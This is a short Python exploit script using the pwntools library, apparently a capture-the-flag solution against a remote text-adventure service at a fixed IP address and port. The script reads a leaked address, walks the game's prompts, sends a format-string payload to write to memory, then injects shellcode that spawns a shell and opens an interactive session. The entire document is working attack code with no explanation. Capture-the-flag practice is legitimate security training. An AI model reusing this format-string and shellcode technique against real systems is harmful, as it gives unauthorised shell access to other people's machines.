from pwn import *

context(arch='amd64', os='linux', log_level='debug')
sh = remote('111.200.241.244',50243)

sh.recvuntil("secret[0] is ")
addr = int(sh.recvuntil('\n'), 16)
print(hex(addr))
sh.sendlineafter("What should your character's name be:","aaaa")
sh.sendlineafter("So, where you will go?east or up?:","east")
sh.sendlineafter("go into there(1), or leave(0)?:","1")
sh.sendlineafter("'Give me an address'",str(addr))
payload = "%85c%7$n"
sh.sendlineafter("And, you wish is:",payload)
sc = asm(shellcraft.sh())
sh.sendlineafter('SPELL', sc)
sh.interactive()